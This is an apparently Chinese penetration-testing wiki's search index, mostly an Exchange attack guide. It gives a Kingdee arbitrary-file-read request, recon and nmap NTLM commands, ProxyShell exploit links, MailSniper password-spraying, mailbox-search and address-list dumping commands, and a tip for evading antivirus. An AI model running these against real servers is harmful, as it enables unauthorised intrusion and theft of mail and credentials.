\u91d1\u8776","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%87%91%E8%9D%B6/%E9%87%91%E8%9D%B6/#_3","text":"","title":"\u91d1\u8776\u4e91\u661f\u7a7a"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%87%91%E8%9D%B6/%E9%87%91%E8%9D%B6/#commonsfileserver","text":"GET /CommonFileServer/c:/windows/win.ini","title":"\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6CommonsFileServer"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%87%91%E8%9D%B6/%E9%87%91%E8%9D%B6/#_4","text":"","title":"\u91d1\u8776"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/","text":"\u9488\u5bf9EXCHANGE\u7684\u653b\u51fb\u65b9\u5f0f \u76ee\u5f55 exchange\u5feb\u901f\u4e86\u89e3 \u90ae\u4ef6\u670d\u52a1\u5668\u89d2\u8272 exchange 2010 exchange 2013 \u63a5\u53e3\u548c\u534f\u8bae OWA ECP outlook anywhere MAPI EAS EWS \u529f\u80fd\u548c\u670d\u52a1 Autodiscover GAL EXCHANGE\u4fe1\u606f\u641c\u96c6 \u53d1\u73b0 \u7aef\u53e3\u626b\u63cf spn \u7279\u6b8a\u57df\u540d \u5bfb\u627e\u63a5\u53e3 \u5de5\u5177\u4f7f\u7528 \u7248\u672c\u786e\u5b9a IP\u6cc4\u9732 \u6cc4\u9732exchange\u670d\u52a1\u5668\u4fe1\u606f EXCHANGE \u5916\u56f4\u6253\u70b9 proxyshell \u547d\u4ee4\u6267\u884c \u7206\u7834 EXCHANGE \u540e\u6e17\u900f \u90ae\u4ef6\u5185\u5bb9\u68c0\u7d22 \u83b7\u53d6\u5168\u5c40\u5730\u5740\u8868 \u901a\u7528\u65b9\u6848MailSniper \u5728\u57df\u5185\u8fdb\u884c\u5bfc\u51fa ruler\u5bfc \u67e5\u627e\u5b58\u5728\u7f3a\u9677\u7684\u7528\u6237\u90ae\u7bb1\u6743\u9650\u59d4\u6d3e \u901a\u8fc7exchange\u7528\u6237\u7ec4\u8fdb\u884c\u57df\u63d0\u6743 NTLM relay OUTLOOK \u547d\u4ee4\u6267\u884c proxylogon \u547d\u4ee4\u6267\u884c CVE-2020-0688 rce exchange\u5feb\u901f\u4e86\u89e3 FOFA\uff1a microsoft exchange 2013\uff1a app=\"Microsoft-Exchange-2013\"||app=\"Microsoft-Exchange-Server-2013-CU21\"||app=\"Microsoft-Exchange-Server-2013-CU17\"||app=\"Microsoft-Exchange-Server-2013-CU23\"||app=\"Microsoft-Exchange-Server-2013-CU13\"||app=\"Microsoft-Exchange-Server-2013-CU22\"||app=\"Microsoft-Exchange-Server-2013-CU11\"||app=\"Microsoft-Exchange-Server-2013-CU2\"||app=\"Microsoft-Exchange-Server-2013-CU16\"||app=\"Microsoft-Exchange-Server-2013-CU19\"||app=\"Microsoft-Exchange-Server-2013-CU3\"||app=\"Microsoft-Exchange-Server-2013-CU18\"||app=\"Microsoft-Exchange-Server-2013-CU5\"||app=\"Microsoft-Exchange-Server-2013-CU20\"||app=\"Microsoft-Exchange-Server-2013-CU12\"||app=\"Microsoft-Exchange-Server-2013-CU15\"||app=\"Microsoft-Exchange-Server-2013-CU10\"||app=\"Microsoft-Exchange-Server-2013-CU9\"||app=\"Microsoft-Exchange-Server-2013-CU6\"||app=\"Microsoft-Exchange-Server-2013-CU7\"||app=\"Microsoft-Exchange-Server-2013-CU1\"||app=\"Microsoft-Exchange-Server-2013-CU14\"||app=\"Microsoft-Exchange-Server-2013-CU8\"||app=\"Microsoft-Exchange-Server-2013-RTM\"||app=\"Microsoft-Exchange-Server-2013-SP1\"||app=\"Microsoft-Exchange-2013\" microsoft exchange 2016\uff1a app=\"Microsoft-Exchange-Server-2016-CU19\"||app=\"Microsoft-Exchange-Server-2016-CU3\"||app=\"Microsoft-Exchange-Server-2016-CU12\"||app=\"Microsoft-Exchange-Server-2016-RTM\"||app=\"Microsoft-Exchange-Server-2016-CU7\"||app=\"Microsoft-Exchange-Server-2016-CU17\"||app=\"Microsoft-Exchange-Server-2016-CU2\"||app=\"Microsoft-Exchange-Server-2016-CU1\"||app=\"Microsoft-Exchange-Server-2016-CU14\"||app=\"Microsoft-Exchange-Server-2016-CU5\"||app=\"Microsoft-Exchange-Server-2016-CU11\"||app=\"Microsoft-Exchange-Server-2016-CU9\"||app=\"Microsoft-Exchange-Server-2016-CU16\"||app=\"Microsoft-Exchange-Server-2016-CU10\"||app=\"Microsoft-Exchange-Server-2016-CU6\"||app=\"Microsoft-Exchange-Server-2016-CU13\"||app=\"Microsoft-Exchange-Server-2016-CU18\"||app=\"Microsoft-Exchange-Server-2016-CU8\"||app=\"Microsoft-Exchange-Server-2016-CU4\"||app=\"Microsoft-Exchange-2016-POP3-server\" microsoft exchange 2019\uff1a app=\"Microsoft-Exchange-Server-2019-CU5\"||app=\"Microsoft-Exchange-Server-2019-CU3\"||app=\"Microsoft-Exchange-Server-2019-Preview\"||app=\"Microsoft-Exchange-Server-2019-CU8\"||app=\"Microsoft-Exchange-Server-2019-CU1\"||app=\"Microsoft-Exchange-Server-2019-CU7\"||app=\"Microsoft-Exchange-Server-2019-CU2\"||app=\"Microsoft-Exchange-Server-2019-CU6\"||app=\"Microsoft-Exchange-Server-2019-RTM\"||app=\"Microsoft-Exchange-Server-2019-CU4\" microsoft exchange 2010\uff1a app=\"Microsoft-Exchange-2010-POP3-server-version-03.1\"||app=\"Microsoft-Exchange-Server-2010\" \u90ae\u4ef6\u670d\u52a1\u5668\u89d2\u8272 \u5728exchange 2010\u4e2d\uff0cexchange\u5305\u542b\u4e94\u4e2a\u670d\u52a1\u5668\u89d2\u8272\uff0c\u5206\u522b\u4e3a\u90ae\u7bb1\u670d\u52a1\u5668\uff0c\u5ba2\u6237\u7aef\u8bbf\u95ee\u670d\u52a1\u5668\uff0c\u96c6\u7ebf\u4f20\u8f93\u670d\u52a1\u5668\uff0c\u7edf\u4e00\u6d88\u606f\u670d\u52a1\u5668\uff0c\u8fb9\u7f18\u4f20\u8f93\u670d\u52a1\u5668\u3002 \u5728\u540e\u6765\u7684exchange 2013\u4e2d\u670d\u52a1\u5668\u88ab\u7cbe\u7b80\u4e3a3\u4e2a\uff1a\u90ae\u7bb1\u670d\u52a1\u5668\uff0c\u5ba2\u6237\u7aef\u8bbf\u95ee\u670d\u52a1\u5668\uff0c\u8fb9\u7f18\u4f20\u8f93\u670d\u52a1\u5668 exchange 2016\u548c2019\u4e2d\u5219\u53ea\u6709 \u90ae\u7bb1\u670d\u52a1\u5668\u548c\u8fb9\u7f18\u4f20\u8f93\u670d\u52a1\u5668\u4e86\u3002 exchange 2010 \u90ae\u7bb1\u670d\u52a1\u5668 mailbox server\uff0c\u63d0\u4f9b\u6258\u7ba1\u90ae\u7bb1\uff0c\u516c\u5171\u6587\u4ef6\u5939\u7b49\u670d\u52a1\uff0c\u662f\u5fc5\u9009\u7684\u670d\u52a1\u5668\u89d2\u8272 \u5ba2\u6237\u7aef\u8bbf\u95ee\u670d\u52a1\u5668 client access server\uff0c\u7528\u6765\u63a5\u6536\u5e76\u5904\u7406\u4e0d\u540c\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\uff0c\u5e76\u63d0\u4f9b\u5404\u79cd\u63a5\u53e3\u7ed9\u5ba2\u6237\u4ee5\u8bbf\u95eeExchange\u670d\u52a1, MAPI\u8bbf\u95ee POP3\u548cIMAP4\u8bbf\u95ee Outlook Web App\u8bbf\u95ee\uff08OWA\uff09 Outlook Anywhere\u8bbf\u95ee Autodiscover\u81ea\u52a8\u53d1\u73b0\u670d\u52a1 \u53ef\u7528\u6027\u670d\u52a1 \u96c6\u7ebf\u4f20\u8f93\u670d\u52a1\u5668 hub transport server\uff0c\u6838\u5fc3\u670d\u52a1\u662fMicrosoft Exchange Transport\uff0c\u7528\u4e8e\u5904\u7406\u5927\u591a\u6570\u90ae\u4ef6\u7684\u8def\u7531\u3001\u7b56\u7565\u7b49\u4ee5\u53caMail Flow\u3002\u8d77\u4e00\u4e2a\u90ae\u4ef6\u4f20\u8f93\u4e2d\u7ee7\u7684\u4f5c\u7528\u3002 \u7edf\u4e00\u6d88\u606f\u670d\u52a1\u5668 unified messaging server\uff0c\u7528\u4e8e\u5141\u8bb8\u90ae\u7bb1\u7528\u6237\u53ef\u4ee5\u5728\u90ae\u4ef6\u4e2d\u53d1\u9001\u5b58\u50a8\u8bed\u97f3\u6d88\u606f\u548c\u4f20\u771f\u6d88\u606f\uff0c\u53ef\u9009\u89d2\u8272 \u8fb9\u7f18\u4f20\u8f93\u670d\u52a1\u5668 edge transport server\uff0c\u901a\u5e38\u90e8\u7f72\u4e8e\u7f51\u7edc\u8fb9\u754c\u3002\u5176\u63a5\u53d7\u6765\u81ea\u5185\u90e8\u7ec4\u7ec7\u7684\u90ae\u4ef6\u548c\u6765\u81ea\u5916\u90e8\u53ef\u4fe1\u670d\u52a1\u5668\u7684\u90ae\u4ef6\uff0c\u7136\u540e\u5e94\u7528\u7279\u5b9a\u7684\u53cd\u5783\u573e\u90ae\u4ef6\u3001\u53cd\u75c5\u6bd2\u7b56\u7565\uff0c\u6700\u540e\u5c06\u901a\u8fc7\u7b56\u7565\u7b5b\u9009\u7684\u90ae\u4ef6\u8def\u7531\u5230\u5185\u90e8\u7684\u96c6\u7ebf\u4f20\u8f93\u670d\u52a1\u5668\uff0c\u53ef\u9009\u89d2\u8272 exchange 2013 \u90ae\u7bb1\u670d\u52a1\u5668 \u6258\u7ba1\u90ae\u7bb1\u3001\u516c\u5171\u6587\u4ef6\u5939\u7b49\u6570\u636e\uff0c\u4e3b\u8981\u5305\u542b\u96c6\u7ebf\u4f20\u8f93\u670d\u52a1\uff08Hub Transport service\uff09\u548c\u90ae\u7bb1\u4f20\u8f93\u670d\u52a1\uff08Mailbox Transport service\uff09\u4e24\u5927\u7ec4\u4ef6\u670d\u52a1\u3002 \u5ba2\u6237\u7aef\u8bbf\u95ee\u670d\u52a1\u5668 \u8d1f\u8d23\u8ba4\u8bc1\u3001\u91cd\u5b9a\u5411\u3001\u4ee3\u7406\u6765\u81ea\u5916\u90e8\u4e0d\u540c\u5ba2\u6237\u7aef\u7684\u8bbf\u95ee\u8bf7\u6c42\uff0c\u4e3b\u8981\u5305\u542b\u5ba2\u6237\u7aef\u8bbf\u95ee\u670d\u52a1\uff08Client Access service\uff09\u548c\u524d\u7aef\u4f20\u8f93\u670d\u52a1\uff08Front End Transport service\uff09\u4e24\u5927\u7ec4\u4ef6\u3002 \u8fb9\u7f18\u4f20\u8f93\u670d\u52a1\u5668 \u8d1f\u8d23\u8def\u7531\u51fa\u7ad9\u4e0e\u5165\u7ad9\u90ae\u4ef6\u3001\u7b56\u7565\u5e94\u7528\u7b49\u3002 \u63a5\u53e3\u548c\u534f\u8bae OWA owa\u5373 outlook web app,\u5373outlook\u7684\u7f51\u9875\u7248\u3002\uff08outlook\u662fexchange\u7684\u5ba2\u6237\u7aef\u8f6f\u4ef6\uff0c\u8bb8\u591a\u7535\u8111\u90fd\u6709\u6240\u9884\u88c5\uff09 \u5730\u5740\u4e00\u822c\u4e3a http://aa.com/owa ECP Exchange Administrative Center,\u5373exchange\u7ba1\u7406\u4e2d\u5fc3\uff0c\u7ba1\u7406\u5458\u7684web\u63a7\u5236\u53f0 outlook anywhere \u4f5c\u7528\u662f\u53ef\u4ee5\u8ba9\u5916\u7f51\u7528\u6237\u76f4\u63a5\u901a\u8fc7outlook anywhere \u76f4\u63a5\u767b\u5f55\u5230exchange\u90ae\u7bb1\u800c\u65e0\u9700\u4f7f\u7528VPN\u3002\u8be5\u7279\u6027\u5728exchange server 2013\u4e2d\u9ed8\u8ba4\u5f00\u542f\uff0c\u4e5f\u5c31\u662f\u8bf4\u5728exchange server 2013 \u4ee5\u540eoutlook \u4e0d\u518d\u533a\u5206\u5185\u5916\u7f51\u73af\u5883\u3002 MAPI \u4e8eExchange 2013 SP1\u548cOutlook 2013 SP1\u4e2d\u88ab\u63d0\u51fa\u7684\u4e00\u79cd\u65b0\u7684outlook\u4e0eexchange\u4ea4\u4e92\u4f20\u8f93\u534f\u8bae\u3002 EAS Exchange ActiveSync\u662f\u4e00\u79cd\u5141\u8bb8\u7528\u6237\u901a\u8fc7\u79fb\u52a8\u8bbe\u5907\u6216\u5176\u4ed6\u4fbf\u643a\u5f0f\u8bbe\u5907\u8bbf\u95ee\u548c\u7ba1\u7406\u90ae\u4ef6\u3001\u8054\u7cfb\u4eba\u3001\u65e5\u5386\u7b49Exchange\u529f\u80fd\u7684\u540c\u6b65\u534f\u8bae\uff0c\u5728Windows\u4e0a\u4f7f\u7528\u65f6\u5176\u8fdb\u7a0b\u540d\u79f0\u4e3awcesomm.exe\u3002\u201d EWS Exchange Web Service\uff0c\u662fexchange\u63d0\u4f9b\u7684\u4e00\u5957API\u7f16\u7a0b\u63a5\u53e3\uff0c\u7528\u4e8e\u64cd\u4f5cexchange\u76f8\u5173\u529f\u80fd\uff0c\u4e8eexchange server 2007\u88ab\u63d0\u51fa\u3002 \u529f\u80fd\u548c\u670d\u52a1 Autodiscover Autodiscover\uff0c\u81ea\u52a8\u53d1\u73b0\uff0c\u662fexchange server 2007 \u63a8\u51fa\u7684\u4e00\u4e2a\u670d\u52a1\u3002 \u8be5\u670d\u52a1\u76ee\u7684\u662f\u7b80\u5316\u7528\u6237\u767b\u5f55\u6d41\u7a0b\uff1a\u7528\u6237\u53ea\u9700\u8981\u8f93\u5165\u81ea\u5df1\u7684\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u548c\u5bc6\u7801\uff0c\u5c31\u80fd\u591f\u901a\u8fc7Autodiscover\u670d\u52a1\u83b7\u53d6\u8fd0\u884c\u5ba2\u6237\u7aef\u5e94\u7528\u7a0b\u5e8f\u6240\u9700\u7684\u914d\u7f6e\u4fe1\u606f \u8be5\u670d\u52a1\u8fd0\u884c\u5728\u5ba2\u6237\u7aef\u8bbf\u95ee\u670d\u52a1\u5668\u4e0a\u3002 GAL GAL\u5373\u5168\u5c40\u5730\u5740\u8868\uff08global address list\uff09 \u8bb0\u5f55\u4e86\u57df\u4e2d\u7528\u6237\u7684\u57fa\u672c\u4fe1\u606f\u4e0e\u5176\u90ae\u7bb1\u5730\u5740\uff0c\u4ee5\u5f62\u6210\u57df\u7528\u6237\u4e0e\u90ae\u7bb1\u7528\u6237\u4e4b\u95f4\u7684\u5173\u8054\u3002 \u5728\u6e17\u900f\u4e2d\u53ef\u4ee5\u901a\u8fc7GAL\u6765\u83b7\u53d6\u6240\u6709\u90ae\u7bb1\u5730\u5740\u3002 EXCHANGE\u4fe1\u606f\u641c\u96c6 \u5728\u6e17\u900f\u4e2d\u8be5\u5982\u4f55\u53d1\u73b0\u54ea\u4e00\u53f0\u673a\u5668\u662fEXCHANGE\u670d\u52a1\u5668\u5462\uff1f \u5728exchange server 2019 \u4e2d\uff0c\u7531\u4e8e\u53ea\u7ec6\u5206\u4e86\u90ae\u7bb1\u670d\u52a1\u5668\u548c\u8fb9\u7f18\u4f20\u8f93\u670d\u52a1\u5668\uff0c\u6240\u4ee5\u5f00\u653e\u4e86\u5982OWA\uff0cECP\u7b49\u63a5\u53e3\u7684\u670d\u52a1\u5668\u5373\u4e3a\u90ae\u7bb1\u670d\u52a1\u5668\u3002 \u53d1\u73b0 \u7aef\u53e3\u626b\u63cf exchange\u4f1a\u5bf9\u5916\u66b4\u9732\u63a5\u53e3\u5982OWA,ECP\u7b49\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e9b\u7aef\u53e3\u7279\u5f81\u6765\u53d1\u73b0exchange\u3002 exchange \u63a5\u53e3\u4f1a\u66b4\u9732\u572880\u7aef\u53e3\uff0c\u540c\u65f625/587/2525\u7b49\u7aef\u53e3\u4e0a\u4f1a\u6709SMTP\u670d\u52a1\u3002 spn \u5982\u679c\u5df2\u7ecf\u6253\u5165\u57df\u4e2d\uff0c\u60f3\u5feb\u901f\u7684\u5b9a\u4f4d\u5230exchange\u670d\u52a1\u5668\uff0c\u53ea\u9700\u8981\u67e5\u8be2\u57df\u4e2dspn\u670d\u52a1\u5373\u53ef\u3002 setspn -q */* \u7279\u6b8a\u57df\u540d https://autodiscover.domain.com/autodiscover/autodiscover.xml https://owa.domian/owa/ https://mail.domain.com/ https://webmail.domain.com/ \u5bfb\u627e\u63a5\u53e3 /autoDiscover/ \u81eaExchange Server 2007\u5f00\u59cb\u63a8\u51fa\u7684\u4e00\u9879\u81ea\u52a8\u670d\u52a1\uff0c\u7528\u4e8e\u81ea\u52a8\u914d\u7f6e\u7528\u6237\u5728Outlook\u4e2d\u90ae\u7bb1\u7684\u76f8\u5173\u8bbe\u7f6e\uff0c\u7b80\u5316\u7528\u6237\u767b\u9646\u4f7f\u7528\u90ae\u7bb1\u7684\u6d41\u7a0b\u3002 /ecp/\u201cExchange Control Panel\u201d Exchange\u7ba1\u7406\u4e2d\u5fc3\uff0c\u7ba1\u7406\u5458\u7528\u4e8e\u7ba1\u7406\u7ec4\u7ec7\u4e2d\u7684Exchange\u7684Web\u63a7\u5236\u53f0 /eWS/\u201cExchange Web Services\u201d Exchange Web Service,\u5b9e\u73b0\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u4e4b\u95f4\u57fa\u4e8eHTTP\u7684SOAP\u4ea4\u4e92 /mapi/ Outlook\u8fde\u63a5Exchange\u7684\u9ed8\u8ba4\u65b9\u5f0f\uff0c\u57282013\u548c2013\u4e4b\u540e\u5f00\u59cb\u4f7f\u7528\uff0c2010 sp2\u540c\u6837\u652f\u6301 /microsoft-Server-ActiveSync/ \u7528\u4e8e\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u7535\u5b50\u90ae\u4ef6 /OAB/\u201cOffline Address Book\u201d \u7528\u4e8e\u4e3aOutlook\u5ba2\u6237\u7aef\u63d0\u4f9b\u5730\u5740\u7c3f\u7684\u526f\u672c\uff0c\u51cf\u8f7bExchange\u7684\u8d1f\u62c5 /owa/\u201cOutlook Web APP\u201d Exchange owa \u63a5\u53e3\uff0c\u7528\u4e8e\u901a\u8fc7web\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u90ae\u4ef6\u3001\u65e5\u5386\u3001\u4efb\u52a1\u548c\u8054\u7cfb\u4eba\u7b49 /powerShell/ \u7528\u4e8e\u670d\u52a1\u5668\u7ba1\u7406\u7684Exchange\u7ba1\u7406\u63a7\u5236\u53f0 /Rpc/ \u65e9\u671f\u7684Outlook\u8fd8\u4f7f\u7528\u79f0\u4e3aOutlook Anywhere\u7684RPC\u4ea4\u4e92 \u5de5\u5177\u4f7f\u7528 https://github.com/vysec/checkO365 \u7248\u672c\u786e\u5b9a \u53ef\u4ee5\u901a\u8fc7OWA,ECP\u7684HTML\u6e90\u4ee3\u7801\u786e\u5b9a\u7248\u672c \u6e90\u4ee3\u7801\u641c\u7d22favicon.ico \u53ef\u4ee5\u770b\u5230\u4e00\u4e32\u6570\u5b57 15.0.1130,\u8fd9\u662fexchange\u5177\u4f53\u7248\u672c\u53f7\uff0c\u5230\u8fd9\u91cc\u67e5\u5c31\u884c\u4e86 https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019 IP\u6cc4\u9732 \u6293\u5305\u4ee5\u4e0b\u63a5\u53e3\u5305\uff0c\u5c06HTTP\u7248\u672c\u6539\u4e3a1.0\uff0c\u5e76\u5220\u9664HOST\u5934\uff0c\u5c31\u4f1a\u66b4\u9732exchange ip\uff0c\u6709\u65f6\u4f1a\u66b4\u9732\u5185\u7f51IP /Microsoft-Server-ActiveSync/default.eas /Microsoft-Server-ActiveSync /Autodiscover/Autodiscover.xml /Autodiscover /Exchange /Rpc /EWS/Exchange.asmx /EWS/Services.wsdl /EWS /ecp /OAB /OWA /aspnet_client /PowerShell \u60f3\u8981\u66f4\u65b9\u4fbf\u7684\u8bdd\uff0c\u53ef\u4ee5\u7528msf\u7684\u6a21\u5757\u81ea\u52a8\u641c\u96c6 use auxiliary/scanner/http/owa_iis_internal_ip \u6cc4\u9732exchange\u670d\u52a1\u5668\u4fe1\u606f \u5f53\u6211\u4eec\u5bf9exchange\u670d\u52a1\u5668\u8fdb\u884cNTLM\u8d28\u8be2\u65f6,\u5728\u670d\u52a1\u5668\u8fd4\u56dechallenge\u65f6\u540c\u65f6\u4f1a\u8fd4\u56de\u57df\u4fe1\u606f\uff0c\u673a\u5668\u540d\u7b49\u4fe1\u606f\u3002\u4ee5\u6b64\u4e3a\u57fa\u7840\u53ef\u4ee5\u5bf9exchange\u8fdb\u884c\u670d\u52a1\u5668\u4fe1\u606f\u641c\u96c6 \u76f4\u63a5nmap nmap host -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll -Pn EXCHANGE \u5916\u56f4\u6253\u70b9 proxyshell \u547d\u4ee4\u6267\u884c \u00b7 Exchange Server 2013 Versions < Builder 15.0.1497.012 \u00b7 Exchange Server 2016 CU18 < Builder 15.1.2106.013 \u00b7 Exchange Server 2016 CU19 < Builder 15.1.2176.009 \u00b7 Exchange Server 2019 CU7 < Builder 15.2.0721.013 https://github.com/dmaasland/proxyshell-poc.git https://github.com/horizon3ai/proxyshell \u7206\u7834 \u63a5\u89e6\u5230exchange\u7684\u7b2c\u4e00\u6b65\u81ea\u7136\u662f\u63a5\u89e6\u5230\u5b83\u7684\u63a5\u53e3\u670d\u52a1\u5982OWA,ECP\u7b49\u3002 \u7531\u4e8e\u662f\u767b\u5f55\u6846\uff0c\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u7528\u7206\u7834\u6765\u8fdb\u884c\u653b\u51fb\u3002\u901a\u5e38\u60c5\u51b5\u4e0bEXCHANGE\u4e0d\u9650\u5236\u5927\u5b57\u5178\u7206\u7834\u3002 \u5e38\u89c1\u53ef\u7206\u7834\u63a5\u53e3 /Autodiscover/Autodiscover.xml # \u81ea Exchange Server 2007 \u5f00\u59cb\u63a8\u51fa\u7684\u4e00\u9879\u81ea\u52a8\u670d\u52a1,\u7528\u4e8e\u81ea\u52a8\u914d\u7f6e\u7528\u6237\u5728Outlook\u4e2d\u90ae\u7bb1\u7684\u76f8\u5173\u8bbe\u7f6e,\u7b80\u5316\u7528\u6237\u767b\u5f55\u4f7f\u7528\u90ae\u7bb1\u7684\u6d41\u7a0b\u3002 /Microsoft-Server-ActiveSync/default.eas /Microsoft-Server-ActiveSync # \u7528\u4e8e\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u7535\u5b50\u90ae\u4ef6 /Autodiscover /Rpc/ # \u65e9\u671f\u7684 Outlook \u8fd8\u4f7f\u7528\u79f0\u4e3a Outlook Anywhere \u7684 RPC \u4ea4\u4e92 /EWS/Exchange.asmx /EWS/Services.wsdl /EWS/ # Exchange Web Service,\u5b9e\u73b0\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u4e4b\u95f4\u57fa\u4e8eHTTP\u7684SOAP\u4ea4\u4e92 /OAB/ # \u7528\u4e8e\u4e3aOutlook\u5ba2\u6237\u7aef\u63d0\u4f9b\u5730\u5740\u7c3f\u7684\u526f\u672c,\u51cf\u8f7b Exchange \u7684\u8d1f\u62c5 /owa # Exchange owa \u63a5\u53e3,\u7528\u4e8e\u901a\u8fc7web\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u90ae\u4ef6\u3001\u65e5\u5386\u3001\u4efb\u52a1\u548c\u8054\u7cfb\u4eba\u7b49 /ecp # Exchange \u7ba1\u7406\u4e2d\u5fc3,\u7ba1\u7406\u5458\u7528\u4e8e\u7ba1\u7406\u7ec4\u7ec7\u4e2d\u7684Exchange \u7684Web\u63a7\u5236\u53f0 /Mapi # Outlook\u8fde\u63a5 Exchange \u7684\u9ed8\u8ba4\u65b9\u5f0f,\u57282013\u548c2013\u4e4b\u540e\u5f00\u59cb\u4f7f\u7528,2010 sp2\u540c\u6837\u652f\u6301 /powershell # \u7528\u4e8e\u670d\u52a1\u5668\u7ba1\u7406\u7684 Exchange \u7ba1\u7406\u63a7\u5236\u53f0 \u7206\u7834\u6bd4\u8f83\u5b9e\u7528\u7684\u5de5\u5177\u6709Eburst\u548cRuler https://github.com/grayddq/EBurst \uff08py\uff09 https://github.com/sensepost/ruler \uff08exe\uff09 ruler\u7531\u4e8ewindows\u7248\u7684\u663e\u793a\u4f3c\u4e4e\u6709\u70b9\u95ee\u817f\uff0c\u8fd9\u91cc\u7528\u7684linux\u7248\u672c autodiscover \u7206\u7834\u7684\u539f\u7406\u662f\uff0c\u8bbf\u95eeautodiscover\u65f6\u6d4f\u89c8\u5668\u4f1a\u5f39\u51fa\u8ba4\u8bc1\u6846\uff0c\u5f53\u8f93\u5165\u6b63\u786e\u7684\u51ed\u8bc1\u540e\u5219\u4f1a\u663e\u793aXML\u6587\u6863\u5185\u5bb9\u3002 ps\\://github.com/dafthack/MailSniper \uff08ps1\uff09 \u4e0b\u9762\u7684\u662f\u5bc6\u7801\u55b7\u6d12\u7684\u653b\u51fb\u65b9\u5f0f\uff0c-Password\u9879\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u8bb0\u5f55password\u7684\u5b57\u5178txt \u5bf9OWA\u8fdb\u884c\u7206\u7834 Import-Module .\\MailSniper.ps1 Invoke-PasswordSprayOWA -ExchHostname OWAHOST -UserList .\\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose \u5bf9EWS\u8fdb\u884c\u7206\u7834 Invoke-PasswordSprayEWS -ExchHostname EWSHOST -UserList .\\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose EXCHANGE \u540e\u6e17\u900f \u90ae\u4ef6\u5185\u5bb9\u68c0\u7d22 \u6211\u4eec\u83b7\u53d6\u4e00\u4e2aexchange\u7528\u6237\u4ee5\u540e\uff0c\u53ef\u4ee5\u5bf9\u90ae\u4ef6\u5217\u8868\u8fdb\u884c\u68c0\u7d22\u83b7\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u65b9\u4fbf\u4e0b\u4e00\u6b65\u6e17\u900f MailSniper \u53ef\u4ee5\u5b8c\u6210\u8fd9\u4e2a\u4efb\u52a1\uff0c\u4f46\u662f\u8fd9\u4e2a\u5de5\u5177\u611f\u89c9\u88ab\u6740\u7684\u6bd4\u8f83\u4e25\u91cd\uff0c\u53ef\u4ee5\u8bd5\u7740\u4fee\u6539\u4e00\u4e0b\u51fd\u6570\u540d\u53d8\u91cf\u540d\u5565\u7684\u514d\u514d\u6740\u3002 \u68c0\u7d22\u6307\u5b9a\u7528\u6237 \u68c0\u7d22rengan@const.com\u7684 \u6536\u4ef6\u7bb1\u6587\u4ef6\u5939\u91cc\u7684 \u5185\u5bb9\u542b\u6709\u673a\u5bc6\u7684 \u90ae\u4ef6\uff0c\u5728\u542f\u7528remote\u53c2\u6570\u540e\u4f1a\u5f39\u51fa\u4e00\u4e2a\u8f93\u5165\u6846\u8f93\u5165\u90ae\u7bb1\u7968\u636e Invoke-SelfSearch -Mailbox rengan@const.com -Terms *\u673a\u5bc6* -Folder \u6536\u4ef6\u7bb1 -ExchangeVersion Exchange2013_SP1 -remote -OutputCsv a.csv \u53ef\u4ee5\u53d1\u73b0\u5728\u4e2d\u6587\u7684exchange\u4e0b\uff0c\u7528\u6237\u7684\u90ae\u4ef6\u4e00\u822c\u5b58\u653e\u4e8e\"\"\u6536\u4ef6\u7bb1\"\"\u6587\u4ef6\u5939\uff0c\u800c\u5bf9\u4e8e\u82f1\u6587\u5219\u662f\"inbox\" \u83b7\u53d6\u5168\u5c40\u5730\u5740\u8868 \u901a\u7528\u65b9\u6848MailSniper \u4f9d\u65e7\u901a\u8fc7MailSniper \u5b9e\u73b0\uff0c\u5728\u6211\u4eec\u83b7\u5f97\u4e00\u4e2a\u5408\u6cd5\u7528\u6237\u7684\u51ed\u636e\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u83b7\u53d6\u5168\u5c40\u5730\u5740\u8868\u6765\u83b7\u53d6\u6240\u6709\u90ae\u7bb1\u5730\u5740\u3002 Get-GlobalAddressList -ExchHostname Ex -UserName rengan -ExchangeVersion Exchange2013_SP1 -Password ganren@123456 \u5728\u57df\u5185\u8fdb\u884c\u5bfc\u51fa Import-PSSession\u662f\u81ea\u5e26\u7684 $User = \"test\\administrator\" $Pass = ConvertTo-SecureString -AsPlainText DomainAdmin123! -Force $Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://Exchange01.test.com/PowerShell/ -Authentication Kerberos -Credential $Credential Import-PSSession $Session -AllowClobber \u67e5\u770bPSSession\uff1a Get-PSSession 